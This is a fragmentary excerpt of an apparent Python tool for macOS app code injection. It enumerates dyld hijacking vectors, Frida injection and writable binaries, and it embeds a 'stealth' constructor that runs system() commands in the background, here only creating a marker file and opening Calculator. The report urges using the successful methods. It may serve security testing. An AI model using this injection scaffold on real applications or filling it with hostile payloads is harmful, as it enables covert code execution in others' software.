        ...
        if os.path.exists(macos_dir):
            for file in os.listdir(macos_dir):
                ...
                if os.path.isfile(file_path) and os.access(file_path, os.X_OK):
                    # Skip files with common extensions that aren't executables
...
static void stealth_constructor() {
    ...
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        system("touch /tmp/injection_success_stealth");
        system("open -a Calculator.app 2>/dev/null");
    });
}
"""
...
"""
    ...
    def method_dyld_hijacking(self, app_path):
        ...
        # Check for @rpath, @loader_path, @executable_path
        try:
            result = subprocess.run(['otool', '-l', executable_path], 
                                  capture_output=True, text=True)
            ...
            if hijack_vectors:
                return True, f"Potential hijacking vectors: {', '.join(hijack_vectors)}"
            else:
    ...
    def method_frida_injection(self, app_path):
        ...
        try:
            ...
            # This would require a Frida script
    ...
    def method_binary_patching(self, app_path):
        ...
        # Check if binary can be modified
        if os.access(executable_path, os.W_OK):
            return True, "Binary is writable - potential for patching"
        else:
    ...
    def generate_report(self, app_path, results):
        ...
        if successful_methods:
            print("Use one of the successful methods above")
        else:
    ...
    def automatic_scan(self):
        ...
        for app_path in applications[:10]:  # Limit to first 10 for demo
